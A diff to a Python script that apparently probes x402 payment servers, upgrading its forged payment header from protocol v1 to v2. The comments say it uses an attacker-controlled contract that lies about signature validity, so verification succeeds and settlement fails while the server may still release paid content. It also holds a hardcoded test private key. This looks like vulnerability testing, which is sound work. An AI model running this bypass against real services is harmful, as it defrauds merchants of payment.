@@ -5,7 +5,7 @@ import secrets
 import json
 from base64 import urlsafe_b64encode
 
-from simplebase import *  
+from simplebase import *  # noqa: F401,F403
 import config
 from config import pk1, pk2
 from target import current_target
@@ -68,7 +68,6 @@ def _resolve_contract(chain_key: str) -> str:
     env_contract = os.getenv("CONTRACT")
     if env_contract:
         return env_contract
-    
     defaults = {
         # sanitized
         # "base": "",       # mainnet blockbasefee
@@ -78,6 +77,8 @@ def _resolve_contract(chain_key: str) -> str:
 
 
 # Target + chain setup
+# Keep this setup intentionally parallel to erc1271test.py. The v2 script only
+# changes the X-Payment envelope from x402 v1 to x402 v2.
 target = current_target(_resolve_target_name())
 chain_key = target.network
 if chain_key not in CHAIN_PRESETS:
@@ -85,39 +86,61 @@ if chain_key not in CHAIN_PRESETS:
 chain_cfg = CHAIN_PRESETS[chain_key]
 
 chainid = chain_cfg["chainid"]
-CHAINNAME = target.network  # written into header
+# x402 v2 Coinbase expects CAIP-2 network ids, while erc1271test.py uses target.network for v1.
+CHAINNAME = f"eip155:{chainid}"
 USDC = chain_cfg["usdc"]
 USDC_version = chain_cfg["usdc_version"]
 USDC_name = chain_cfg["usdc_name"]
 p = Endpoint_Provider(chain_cfg["endpoints"])
 
-testnet_pk = "1" * 64  
+# when testing testnet, we are using 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A pk = '1'*64
+testnet_pk = "1" * 64  # addr 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
 use_testnet_key = chain_key.endswith("sepolia")
 pk = testnet_pk if use_testnet_key else pk1
-config.privatekey = pk  
+config.privatekey = pk  # keep simplebase helpers aligned
 MYADDR = topub(pk)
 payto = target.pay_to_address or topub(pk2)
 payamount = target.pay_amount
 url = target.needpay_url
 
-# contract under test (our deployed contract)
+# contract under test (attacker-controlled)
 CONTRACT = _resolve_contract(chain_key)
 
+
 def run(target_name=None):
-    import os
     if target_name:
         os.environ["TARGET"] = target_name
 
+    # The script checks for a vulnerability where:
+    # verify succeeds (because the malicious contract lies about signature validity),
+    # but settlement fails, yet the server still grants access to paid content.
     nonce_bytes = secrets.token_bytes(32)
     sig = "" # random sig
     now = int(time.time())
     valid_after = now + target.valid_after_offset
     valid_before = now + target.valid_before_offset
 
-    paymentheader = urlsafe_b64encode(json.dumps({
-        "x402Version": 1,
+    accepted = {
         "scheme": "exact",
         "network": CHAINNAME,
+        "asset": USDC,
+        "amount": str(payamount),
+        "payTo": payto,
+        "maxTimeoutSeconds": 60,
+        "extra": {
+            "name": USDC_name,
+            "version": USDC_version,
+        },
+    }
+
+    paymentheader = urlsafe_b64encode(json.dumps({
+        "x402Version": 2,
+        "resource": {
+            "url": url,
+            "description": "",
+            "mimeType": "",
+        },
+        "accepted": accepted,
         "payload": {
             "signature": sig,
             "authorization": {
@@ -133,12 +156,17 @@ def run(target_name=None):
 
     bal = p.erc20_balanceOf(USDC, CONTRACT)
     print(f"MYADDR: {MYADDR}")
-    print(bal/1e6)
+    print(f"CONTRACT: {CONTRACT}")
+    print(bal / 1e6)
     assert bal > payamount
     x = getsess().get(url, headers={"X-Payment": paymentheader})
     print(x)
+    print("X-Settle-Status:", x.headers.get("X-Settle-Status"))
     if x.status_code != 200:
         print(x.text)
+    else:
+        print(x.text)
+
 
 def main():
     run()
